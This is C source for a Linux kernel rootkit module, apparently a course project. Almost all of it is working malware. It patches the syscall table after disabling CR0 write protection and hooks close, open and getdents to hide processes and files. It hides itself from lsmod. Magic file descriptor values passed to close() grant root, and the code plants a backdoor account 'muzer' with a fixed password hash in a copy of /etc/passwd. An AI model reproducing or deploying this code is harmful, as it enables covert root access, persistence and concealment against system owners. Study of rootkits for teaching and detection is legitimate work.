#include <asm/page.h>
#include <linux/slab.h>
#include <linux/init.h>
#include <asm/unistd.h>
#include <linux/sched.h>
#include <linux/types.h>
#include <linux/limits.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/string.h>
#include <linux/spinlock.h>
#include <linux/syscalls.h>
#include <asm/processor-flags.h>

#if defined(__x86_64__)
#define SYSCALL_TABLE_START 0xffffffff81000000l
#define SYSCALL_TABLE_STOP  0xffffffffa2000000l
unsigned long **syscall_table;
typedef unsigned long pointer_size_t;
#else
#define SYSCALL_TABLE_START  0xc0000000
#define SYSCALL_TABLE_STOP   0xd0000000
unsigned int **syscall_table;
typedef unsigned int pointer_size_t;
#endif

#define BUFSIZE 32768
#define HIDE_PREFIX "cse509--"

#define RKIT_VERBOSE 1
#define PUBMSG(fmt, ...) do {\
    if (RKIT_VERBOSE == 1)\
        printk(KERN_ERR "RKIT: %s\n", fmt, ##__VA_ARGS__);\
} while(0);

struct linux_dirent {
    unsigned long       d_ino;
    unsigned long       d_off;
    unsigned short      d_reclen;
    char                name[1];
};

struct hidden_pids_struct {
    pid_t pid;
    struct list_head list;
};

struct buffer_struct {
    void *buf;
    struct mutex lock;
};

struct buffer_struct buf_struct;
struct hidden_pids_struct hidden_pids;

pid_t proc_open_pid; /* pid of the process that has currently opened '/proc/' */
int proc_open_fd;    /* fd for opened '/proc/' in this process open_files table */
u_int8_t module_hidden = 0;
u_int8_t hide_files_flag = 0;
u_int8_t backdoor_added = 0;

/***************************************************************************/
/* SPECIAL VALUES FOR MALICIOUS COMMUNICATION BETWEEN PROCESSES AND ROOTKIT */
#define ELEVATE_UID     -23121990
#define HIDE_PROCESS    -19091992
#define HIDE_MODULE     -657623
#define SHOW_MODULE     -9032847
#define SHOW_PROCESS    -2051967
#define HIDE_FILES      -7111963
#define SHOW_FILES      -294365563
#define ADD_BACKDOOR    -31337
#define REMOVE_BACKDOOR -841841
/***************************************************************************/

/* To store a pointer to original syscalls */
asmlinkage int (*original_close)(int fd);
asmlinkage int (*original_getdents)(unsigned int fd,
                                    struct linux_dirent *dirp,
                                    unsigned int count);

asmlinkage long (*original_open)(const char __user *pathname,
                                 int flags,
                                 mode_t mode);
int deletes_file(struct file*);

/* Modify the CR0 register to block writes on syscall table */
static void disable_write_protection(void)
{
    unsigned long value;
    asm volatile("mov %%cr0,%0" : "=r" (value), "=m" (__force_order));
    if (value & X86_CR0_WP) {
        value &= ~X86_CR0_WP;
        asm volatile("mov %0,%%cr0": : "r" (value), "m" (__force_order));
    }
}

/* Modify the CR0 register to allow writes on syscall table */
static void enable_write_protection(void)
{
    unsigned long value;
    asm volatile("mov %%cr0,%0" : "=r" (value), "=m" (__force_order));
    if (!(value & X86_CR0_WP)) {
        value |= X86_CR0_WP;
        asm volatile("mov %0,%%cr0": : "r" (value), "m" (__force_order));
    }
}

/*========== Rootkit functionality  ==========*/

/*
 * Creates copies of /etc/shadow and /etc/passwd files.
 * The copies contain a backdoor account with username muzer
 * and password 12345. The User's home directory
 * points to /etc
 */
int add_backdoor(void)
{
    int ret = 0;
    unsigned short int copyfailed = 0;
    char buf[100];
    char* passwd_str = "muzer:x:1000:1000:mu zer,,,:/etc:/bin/bash\n";
    char* shadow_str = "muzer:$6$izMzVORI$eZvXKcMhvorVcrmQtxPEjFPlkwNHWzniroz5BsY1xTpiypfnzk4NyLYs9NO.GhHY7zqNfCMVgTogeJ4xHsRF3/:17132:0:99999:7:::\n";
    char* passwdfile = "/etc/passwd";
    char* shadowfile = "/etc/shadow";
    struct file* pfile = NULL;
    struct file* sfile = NULL;
    struct file* npfile = NULL;
    struct file* nsfile = NULL;

    // Open /etc/passwd in read mode
    pfile = filp_open(passwdfile, O_RDONLY, 0);
    if (IS_ERR(pfile)) {
        PUBMSG("Unable to open /etc/passwd");
        ret = PTR_ERR(pfile);
        goto out; // No files opened yet
    }

    // Check if a file called /etc/muzerpasswd already exists
    npfile = filp_open("/etc/muzerpasswd", O_RDONLY, 0);
    if (!IS_ERR(npfile)) {
        // muzerpasswd file already exists. Lets delete that
        // and then create our own
        PUBMSG("A muzerpasswd file already exists. Deleting to continue...");
        ret = deletes_file(npfile);
        if (ret < 0) {
            PUBMSG("Failed to remove original muzerpasswd");
            goto closefiles_exit;
        }
    }

    // Create a file called /etc/muzerpasswd and add the backdoor to it
    npfile = filp_open("/etc/muzerpasswd",
                       O_CREAT | O_RDWR | O_EXCL | O_TRUNC,
                       S_IRUSR | S_IWUSR);

    ret = kernel_write(npfile, passwd_str, 43, npfile->f_pos);
    if (ret < 0) {
        PUBMSG("Failed to write backdoor to muzerpasswd");
        goto closefiles_exit;
    }
    npfile->f_pos += 43;

    // Copy the rest of /etc/passwd to muzerpasswd
    ret = 0;
    do {
        ret = kernel_read(pfile, pfile->f_pos, buf, 100);
        if (ret < 0) {
            PUBMSG("Failed to kern read pfile");
            copyfailed = 1;
            break;
        }
        pfile->f_pos += ret;
        ret = kernel_write(npfile, buf, ret, npfile->f_pos);
        if (ret < 0) {
            PUBMSG("Failed to kern write to muzerpasswd");
            copyfailed = 1;
        }
        npfile->f_pos += ret;
    } while (ret > 0);
    if (copyfailed) {
        return ret;
    }

    // Rename /etc/passwd to /etc/passwd_old and muzerpasswd to /etc/passwd

    sfile = filp_open(shadowfile, O_RDWR, 0);
    if (IS_ERR(sfile)) {
        PUBMSG("Unable to open /etc/shadow");
        ret = PTR_ERR(sfile);
        goto closefiles_exit;
    }


closefiles_exit:
if (pfile)
    filp_close(pfile, NULL);
if (npfile)
    filp_close(npfile, NULL);
if (sfile)
    filp_close(sfile, NULL);
if (nsfile)
    filp_close(nsfile, NULL);

out:
    return ret;
}

int deletes_file(struct file* filp)
{
    int ret = 0;
    struct inode* rmfile_parent = NULL;
    if (filp == NULL) {
        return 0;
    }
    rmfile_parent = ((filp->f_path).dentry)->d_parent->d_inode;
    ret = vfs_unlink(rmfile_parent, (filp->f_path).dentry, NULL);
    if (ret < 0) {
        printk(KERN_ERR "deletes_file() failed. vfs_unlink returned %d\n", ret);
    }
    return ret;
}

int hide_files(void)
{
    int err = 0;
    if (!hide_files_flag) {
        hide_files_flag = 1;
        err = 1;
    }
    return err;
}

int show_files(void)
{
    int err = 0;
    if (hide_files_flag) {
        hide_files_flag = 0;
        err = 1;
    }
    return err;
}

/* Hide and show the module */
int hide_module(void)
{
    int err = 0;
    if (!module_hidden) {
        module_hidden = 1;

        // stop from showing on lsmod
        list_del_init(&__this_module.list);

        // stop showing in /proc/kallsyms
        kobject_del(&THIS_MODULE->mkobj.kobj);

        err = 1;
    }
    return err;
}

int show_module(void)
{
    int err = 0;
    if (module_hidden) {
        // TODO
        err = 1;
    }
    return err;
}

int elevate_current_privileges(void)
{
    int err = -1;

    struct cred *elevated_cred = prepare_creds();
    kuid_t elevated_uid;
    kgid_t elevated_gid;
    elevated_uid.val = 0;
    elevated_gid.val = 0;

    if (elevated_cred != NULL) {
        elevated_cred->uid = elevated_cred->euid = elevated_cred->suid
             = elevated_cred->fsuid = elevated_uid;
        elevated_cred->gid = elevated_cred->egid = elevated_cred->sgid
             = elevated_cred->fsgid = elevated_gid;

        commit_creds(elevated_cred);
        err = 0;
    }

    return err;
}

void init_hidden_pids_list(void)
{
    INIT_LIST_HEAD(&hidden_pids.list);
}

int is_in_hidden_pids(pid_t pid)
{
    struct hidden_pids_struct *iter;
    list_for_each_entry(iter, &hidden_pids.list, list) {
        if (iter->pid == pid)
            return 1;
    }
    return 0;
}

/* Remove this process's pid from our hidden pids list */
int show_current_process(void)
{
    struct hidden_pids_struct *iter, *tmp;
    pid_t pid = current->pid;
    list_for_each_entry_safe(iter, tmp, &hidden_pids.list, list) {
        if (iter->pid == pid) {
            list_del(&iter->list);
            kfree(iter);
            return 0;
        }
    }
    return -1;
}

/* Add this process's pid to our hidden pids list */
int hide_current_process(void)
{
    int err = 0;
    struct hidden_pids_struct *node;
    pid_t pid = current->pid;

    node = (struct hidden_pids_struct *)
            kmalloc(sizeof(struct hidden_pids_struct), GFP_KERNEL);
    if (node == NULL) {
        err = -1;
        goto out;
    }

    node->pid = pid;
    list_add_tail(&node->list, &hidden_pids.list);
out:
    return err;
}


char *get_str_in_kernelspace(const char __user *ustr, char *kstr, int max)
{
    size_t len = strnlen_user(ustr, max); // including null terminator
    if (len > max)
        return NULL;
    strncpy_from_user(kstr, ustr, len);
    return kstr;
}


/* Is the string ustr same as cmp_with? */
int is_userspace_str(const char __user *ustr, const char *cmp_with)
{
    int ret = 0;
    char *kstr;

    mutex_lock(&(buf_struct.lock));
    kstr = get_str_in_kernelspace(ustr, buf_struct.buf, PATH_MAX);
    if (kstr == NULL)
        goto out;
    if (strcmp(kstr, cmp_with) == 0)
        ret = 1;
out:
    mutex_unlock(&(buf_struct.lock));
    return ret;
}

/*
 * Takes in a string (null-terminated) that
 * represents a component of a pathname
 * tries to convert it into pid_t
 * returns pid if possible
 * -1 otherwise
 */
pid_t get_pid_from_str(const char *str)
{
    int err;
    long res;

    err = kstrtol(str, 10,  &res);
    if (err)
        res = -1;

    return (pid_t) res;
}

/*
 * Takes in a string (null-terminated) that
 * represents a component of a pathname
 * 1 if it matches a pattern that the rootkit wants to hide
 * 0 otherwise
 */
int filename_matches_pattern(const char *filename)
{
    return strncmp(filename, HIDE_PREFIX, strlen(HIDE_PREFIX)) == 0;
}


/*========== Hijacked syscalls' definitions ==========*/
asmlinkage int my_getdents(unsigned int fd,
                           struct linux_dirent *dirp,
                           unsigned int count)
{
    mm_segment_t old_fs;
    struct linux_dirent *dir;
    int ret;
    void *kbuf;
    unsigned long kbuf_offset, ubuf_offset;
    pid_t pid;
    void *ubuf;
    kbuf_offset = ubuf_offset = 0;
    kbuf = buf_struct.buf;
    ubuf = dirp;


    mutex_lock(&(buf_struct.lock));

    old_fs = get_fs();
    set_fs(KERNEL_DS);
    ret = original_getdents(fd, (struct linux_dirent *) kbuf, BUFSIZE);
    set_fs(old_fs);

    if (ret < 0)
        goto out;

    for (kbuf_offset = 0; kbuf_offset < ret; kbuf_offset += dir->d_reclen) {
        dir = (struct linux_dirent *) (kbuf + kbuf_offset);

        if (proc_open_fd == fd && proc_open_pid == current->pid) {
            // this means we are calling getdents on "/proc"
            // we have to hide the pids in our list
            pid = get_pid_from_str(dir->name);
            if (pid > 0 && is_in_hidden_pids(pid))
                continue;
        }

        // also check for special prefixes or suffixes
        // and hide those files that match pattern
        if (hide_files_flag && filename_matches_pattern(dir->name))
                continue;

        // normal copy if nothing to hide
        copy_to_user(ubuf + ubuf_offset, kbuf + kbuf_offset, dir->d_reclen);
        ubuf_offset += dir->d_reclen;
    }

    ret = ubuf_offset;

out:
    mutex_unlock(&(buf_struct.lock));
    return ret;
}



asmlinkage long my_open(const char __user *pathname, int flags, mode_t mode)
{
    long fd;
    fd = original_open(pathname, flags, mode);

    if (fd >= 0 && is_userspace_str(pathname, "/proc")) {
        /* opened "/proc";
           store the process's pid and opened fd
           we'll use these in getdents to hide processes */
        proc_open_pid = current->pid;
        proc_open_fd = fd;
    }

    return fd;
}

asmlinkage int my_close(int fd)
{
    int err = 0;
    if (fd < 0) {
        switch (fd) {
        // None of this ever fails? <<<<<< Must fix!
        case ELEVATE_UID:
            elevate_current_privileges();
            break;
        case HIDE_PROCESS:
            hide_current_process();
            break;
        case SHOW_PROCESS:
            show_current_process();
            break;
        case HIDE_FILES:
            hide_files();
            break;
        case SHOW_FILES:
            show_files();
            break;
        case HIDE_MODULE:
            hide_module();
            break;
        case SHOW_MODULE:
            show_module();
            break;
        case ADD_BACKDOOR:
            add_backdoor();
            break;
        default:
            printk(KERN_EMERG "Wrong rootkit command: %d\n", fd);
        }
    }
    else {
        if (proc_open_fd == fd && proc_open_pid == current->pid) {
            /* closed "/proc";
               clear stored fd and pid */

            proc_open_fd = -1;
            proc_open_pid = -1;
        }
        err = original_close(fd);
    }

    return err;
}

pointer_size_t **find_syscall_table(void)
{
    pointer_size_t i;
    pointer_size_t **table;
    for (i = SYSCALL_TABLE_START; i < SYSCALL_TABLE_STOP; i += sizeof(void *)) {
        table = (pointer_size_t **) i;
        if ( table[__NR_close] == (pointer_size_t *) sys_close)
            return &table[0];
    }
    return NULL;
}

void init_buf_struct(void)
{
    mutex_init(&(buf_struct.lock));
    buf_struct.buf = kmalloc(BUFSIZE, GFP_KERNEL);
}
void deinit_buf_struct(void)
{
    kfree(buf_struct.buf);
}

int rootkit_init(void)
{
    PUBMSG("Rootkit loaded");
    proc_open_fd = -1;
    proc_open_pid = -1;
    module_hidden = 0;
    hide_files_flag = 0;

    init_buf_struct();
    init_hidden_pids_list();

    hide_files();

    /* Uncomment the following lines after completion of module
     * Can't rmmod it if we have it uncommented during dev
     * That's just cumbersome during dev
     */
    //hide_module();

    syscall_table = find_syscall_table();
    if (!syscall_table) {
        goto out;
    }

    //<<<<<< Do we need this?
    printk(KERN_ERR "Syscall table at %p\n", syscall_table);

    // Disable write protection on page
    disable_write_protection();

    // hijack close system call
    original_close = (asmlinkage int (*)(int)) syscall_table[__NR_close];
    syscall_table[__NR_close] = (void *) my_close;

    // hijack open system call
    original_open = (asmlinkage long (*)(const char *, int, mode_t)) syscall_table[__NR_open];
    syscall_table[__NR_open] = (void *) my_open;

    // hijack getdents system call
    original_getdents = (asmlinkage int (*)(unsigned int, struct linux_dirent *, unsigned int))
                        syscall_table[__NR_getdents];
    syscall_table[__NR_getdents] = (void *) my_getdents;

    // <<<<<< read syscall

    // Enable write protection on page
    enable_write_protection();

    out:
    return 0;
}

/* Unloads the rootkit */
void rootkit_exit(void)
{
    deinit_buf_struct();

    if (syscall_table == NULL) {
        PUBMSG("Nothing to unload");
        goto out;
    }

    // Disable write protection on page
    disable_write_protection();

    syscall_table[__NR_close]    = (void *) original_close;
    syscall_table[__NR_open]     = (void *) original_open;
    syscall_table[__NR_getdents] = (void *) original_getdents;
    //<<<<<<Do this for read syscall

    // Enable write protection on page
    enable_write_protection();

out:
    show_module();
    PUBMSG("Rootkit unloaded");
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("BufferOverflowers");
module_init(rootkit_init);
module_exit(rootkit_exit);
